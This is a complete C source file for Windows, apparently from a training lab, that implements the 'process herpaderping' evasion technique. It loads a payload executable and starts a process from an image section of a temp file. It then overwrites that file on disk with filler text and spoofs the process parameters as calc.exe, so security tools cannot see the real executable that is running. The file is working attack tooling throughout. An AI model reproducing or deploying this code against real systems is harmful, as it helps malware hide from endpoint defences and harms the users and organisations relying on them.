#include <Windows.h>
#include <stdio.h>
#include "CWLInc.h"


BYTE* GetPayloadBuffer(OUT size_t& p_size) {
	HANDLE hFile = CreateFileW(L"C:\\temp\\payload64.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		perror("[-] Unable to open payload file... \n");
	}
	p_size = GetFileSize(hFile, NULL);
	BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (bufferAddress == NULL) {
		perror("[-] Failed to allocate memory for payload buffer.. \n");
		exit(-1);
	}
	DWORD bytesRead = 0; 
	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
		perror("[-] Failed to read payload buffer... \n");
		exit(-1);
	}
	CloseHandle(hFile);
	return bufferAddress;
}

ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payload,PROCESS_BASIC_INFORMATION pbi) {
	// Functions Declaration
	_RtlImageNtHeader pRtlImageNtHeader = (_RtlImageNtHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
	if (pRtlImageNtHeader == NULL) {
		perror("[-] Couldn't found API RtlImageNTHeader...\n");
		exit(-1);
	}
	_NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
	if (pNtReadVirtualMemory == NULL) {
		perror("[-] Couldn't found API NtReadVirtualMemory...\n");
		exit(-1);
	}
	// Retrieving entrypoint of our payload
	BYTE image[0x1000];
	ULONG_PTR entryPoint;
	SIZE_T bytesRead;
	NTSTATUS status;
	ZeroMemory(image, sizeof(image));
	status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image, sizeof(image), &bytesRead);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error reading process base address..\n");
		exit(-1);
	}
	wprintf(L"[+] Base Address of target process PEB: %p \n", (ULONG_PTR)((PPEB)image)->ImageBaseAddress);
	entryPoint = (pRtlImageNtHeader(payload)->OptionalHeader.AddressOfEntryPoint);
	entryPoint += (ULONG_PTR)((PPEB)image)->ImageBaseAddress;
	wprintf(L"[+] EntryPoint of the payload buffer: %p \n", entryPoint);
	return entryPoint;
}


BOOL Herpaderping(BYTE* payload,size_t payloadSize) {
	// Functions Declartion
	_NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
	if (pNtCreateSection == NULL) {
		perror("[-] Couldn't find API NtCreateSection...\n");
		exit(-1);
	}
	_NtCreateProcessEx pNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");
	if (pNtCreateProcessEx == NULL) {
		perror("[-] Couldn't find API NtCreateProcessEx...\n");
		exit(-1);
	}
	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL) {
		perror("[-] Couldn't find API NtQueryInformationProcess...\n");
		exit(-1);
	}
	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
	if (pNtCreateThreadEx == NULL) {
		perror("[-] Couldn't find API NtCreateThreadEx\n");
		exit(-1);
	}
	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
	if (pRtlCreateProcessParametersEx == NULL) {
		perror("[-] Couldn't find API RtlCreateProcessParametersEx\n");
		exit(-1);
	}
	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (pRtlInitUnicodeString == NULL) {
		perror("[-] Couldn't find API RtlInitUnicodeString \n");
		exit(-1);
	}
	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	if (pNtWriteVirtualMemory == NULL) {
		perror("[-] Couldn't find API NtWriteVirtualMemory\n");
		exit(-1);
	}
	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	if (pNtAllocateVirtualMemory == NULL) {
		perror("[-] Couldn't find API NtAllocateVirtualMemory...");
		exit(-1);
	}
	HANDLE hTemp;
	HANDLE hSection;
	HANDLE hProcess;
	HANDLE hThread;
	NTSTATUS status;
	PROCESS_BASIC_INFORMATION pbi;
	PEB* remotePEB;
	DWORD bytesWritten;
	signed int bufferSize;
	ULONG_PTR entryPoint;
	UNICODE_STRING uTargetFilePath;
	UNICODE_STRING uDllPath;
	PRTL_USER_PROCESS_PARAMETERS processParameters;


	wchar_t tempFile[MAX_PATH] = {0};
	wchar_t tempPath[MAX_PATH] = { 0 };
	GetTempPathW(MAX_PATH, tempPath);
	GetTempFileNameW(tempPath, L"HD", 0, tempFile);
	wprintf(L"[+] Creating temp file: %s\n", tempFile);
	// Create a temp File
	// later this file holds our payload 
	hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, 
					FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
	if (hTemp == INVALID_HANDLE_VALUE) {
		perror("[-] Unable to create temp file....\n");
		exit(-1);
	}
	// Write Payload into the temp file
	if (!WriteFile(hTemp, payload, payloadSize, &bytesWritten, NULL)) {
		perror("[-] Unable to write payload to the file...\n");
		exit(-1);
	}
	wprintf(L"[+] Payload written into the temp file...\n");


	// CreateSection with temp file
	// SEC_IMAGE flag is set
	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTemp);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable to create section from temp file...\n");
		exit(-1);
	}
	wprintf(L"[+] Section created from the temp file...\n");

	// Create Process with section
	status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(),
						PS_INHERIT_HANDLES , hSection, NULL, NULL, FALSE);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable to create process... \n");
		exit(-1);
	}


	wprintf(L"[+] Spawned the process from the created section...\n");
	// Get remote process information
	status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), 0);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable to Get Process Information...\n");
		exit(-1);
	}
	// Get the entry point
	entryPoint = GetEntryPoint(hProcess, payload, pbi);


	// Modify the file on disk
	SetFilePointer(hTemp, 0, 0, FILE_BEGIN);
	bufferSize = GetFileSize(hTemp, 0);
	bufferSize = 0x1000;
	wchar_t bytesToWrite[] = L"Hello From CyberWarFare Labs\n";
	while (bufferSize > 0) {
		WriteFile(hTemp, bytesToWrite, sizeof(bytesToWrite), &bytesWritten, NULL);
		bufferSize -= bytesWritten;
	}
	wprintf(L"[+] Modified temp file on the disk...\n");


	// Set Process Parameters
	wprintf(L"[+] Crafting process parameters...\n");
	wchar_t targetFilePath[MAX_PATH] = { 0 };
	lstrcpy(targetFilePath, L"C:\\Windows\\System32\\calc.exe");
	pRtlInitUnicodeString(&uTargetFilePath, targetFilePath);
	wchar_t dllDir[] = L"C:\\Windows\\System32";
	UNICODE_STRING uDllDir = { 0 };
	pRtlInitUnicodeString(&uDllPath, dllDir);
	status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
		NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(status)) {
		perror("Unable to create process parameters.. \n");
		exit(-1);
	}

	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
	PVOID paramBuffer = processParameters;
	status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize, 
			MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		perror("Unable to allocate memory for process parameters.. \n");
		exit(-1);
	}
	status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters,
		processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
	if (!NT_SUCCESS(status)) {
		perror("Failed to write process parameters in target process.. \n");
		exit(-1);
	}
	// Getting Remote PEB address
	remotePEB = (PEB*)pbi.PebBaseAddress;
	if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL)) {
		perror("Failed to update process parameters address.. \n");
		exit(-1);
	}
	wprintf(L"[+] Process parameters all set...\n");

	// Create and resume thread
	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
		(LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, 0);
	wprintf(L"[+] Thread executed...\n");
	if (!NT_SUCCESS(status)) {
		perror("Unable to start thread.. \n");
		exit(-1);
	}
	CloseHandle(hTemp);
	return TRUE;
}


int main() {
	size_t payloadSize;
	BYTE* payloadBuffer = GetPayloadBuffer(payloadSize);
	BOOL isSuccess = Herpaderping(payloadBuffer, payloadSize);
	
}